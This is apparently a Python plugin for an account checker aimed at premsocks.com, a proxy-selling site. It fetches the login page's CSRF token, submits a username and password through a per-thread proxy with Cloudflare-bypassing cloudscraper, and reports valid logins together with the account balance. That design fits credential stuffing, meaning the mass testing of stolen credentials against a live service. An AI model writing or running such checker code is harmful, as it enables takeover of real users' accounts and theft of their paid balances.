"""
Checker for Premsocks (premsocks.com)
Accurate success/failure detection using user panel and balance element.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://premsocks.com"
LOGIN_URL = BASE_URL + "/login"
TIMEOUT = 30

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
    })

    try:
        # Step 1: GET login page to extract CSRF token
        resp = session.get(LOGIN_URL, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Extract CSRF token
        token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html, re.I)
        csrf_token = token_match.group(1) if token_match else ""

        payload = {
            "username": username,
            "password": password,
            "_token": csrf_token,
            "ctoken": "",
            "fp_dd": "",
            "fp_dd_json": "",
            "fp": "",
        }

        # Step 2: POST credentials
        post_resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)

        final_html = post_resp.text
        final_url = post_resp.url.lower()

        # --- Check for balance element (strongest success signal) ---
        balance_match = re.search(r'<span[^>]*id="balance-text"[^>]*>(.*?)</span>', final_html, re.I)
        if balance_match:
            balance = balance_match.group(1).strip()
            return True, f"Login successful. Balance: {balance}"

        # --- Check user panel: if it shows "Login/Reg", it's a failure ---
        user_panel_match = re.search(r'<a[^>]*class="[^"]*top icon user[^"]*"[^>]*>(.*?)</a>', final_html, re.I)
        if user_panel_match:
            user_text = user_panel_match.group(1).strip()
            if user_text.lower() == "login/reg":
                return False, "Invalid credentials (user panel shows Login/Reg)"
            # If it shows a username, but no balance, maybe success but balance missing
            # We'll treat as success with no balance
            return True, f"Login successful. Balance: N/A"

        # --- Fallback: check for logout link ---
        if "logout" in final_html.lower():
            return True, "Login successful. Balance: N/A"

        # --- If we are on the socks-proxy page, probably success ---
        if "socks-proxy" in final_url:
            return True, "Login successful (redirected to socks list). Balance: N/A"

        # --- Otherwise, failure ---
        return False, "Login failed – unknown response"

    except Exception as e:
        return False, f"Request error: {str(e)}"